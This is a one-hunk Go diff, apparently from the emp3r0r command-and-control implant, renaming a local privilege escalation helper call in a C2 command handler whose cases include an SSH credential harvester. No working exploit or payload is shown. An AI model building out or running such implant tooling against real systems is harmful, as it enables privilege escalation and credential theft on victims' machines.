@@ -28,7 +28,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		}
 
 		helper := cmdSlice[1]
-		out = lpeHelper(helper)
+		out = runLPEHelper(helper)
 		return
 
 	case emp3r0r_data.C2CmdSSHHarvester:
